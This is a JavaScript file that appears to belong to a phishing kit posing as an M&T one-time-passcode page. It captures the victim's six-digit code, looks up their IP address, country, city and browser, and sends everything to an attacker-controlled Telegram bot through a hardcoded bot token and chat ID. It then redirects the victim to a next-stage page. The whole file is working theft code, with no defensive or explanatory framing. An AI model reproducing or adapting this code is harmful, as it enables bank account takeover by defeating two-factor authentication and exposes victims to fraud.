const inputs = document.querySelectorAll('.otp-container input');
const form = document.getElementById('otpForm');

// Auto-focus and backspace handling
inputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    if (input.value.length === 1 && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    if (index === inputs.length - 1 && input.value.length === 1) {
      form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
    }
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !input.value && index > 0) {
      inputs[index - 1].focus();
    }
  });
});

// Get IP and location info
async function getClientInfo() {
  const info = {
    ip: 'Unknown',
    country: 'Unknown',
    city: 'Unknown',
    browser: navigator.userAgent,
    device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
  };

  try {
    const res = await fetch('https://ipapi.co/json/');
    if (res.ok) {
      const data = await res.json();
      info.ip = data.ip || info.ip;
      info.country = data.country_name || info.country;
      info.city = data.city || info.city;
    }
  } catch (err) {
    console.warn('Failed to fetch IP/location', err);
  }

  return info;
}

// Handle form submission
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const otpValue = Array.from(inputs).map(i => i.value.trim()).join('');

  if (otpValue.length !== 6 || !/^\d{6}$/.test(otpValue)) {
    alert('Please enter all 6 digits.');
    return;
  }

  const info = await getClientInfo();

  const message = `
🔔 ====M&T OTP Submitted====
----------------------------
🔢 Input Code: ${otpValue}

🌐 IP: ${info.ip}
🏳️ Country: ${info.country}
🏙️ City: ${info.city}
💻 Browser: ${info.browser}
📱 Device: ${info.device}
  `;

  const botToken = "8525430088:AAHfMQJCkbpR3oUnnXC37_SWqKiGnvk9zPQ";
  const chatId = "6211090366";
  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message.trim()
      })
    });

    if (response.ok) {
      window.location.href = "otp1.html"; // success redirect
    } else {
      console.error("Telegram Error:", await response.text());
      alert("Failed to send message to Telegram.");
    }
  } catch (err) {
    //console.error('Error sending to Telegram:', err);
    //alert('An error occurred while sending the OTP.');
  }
});
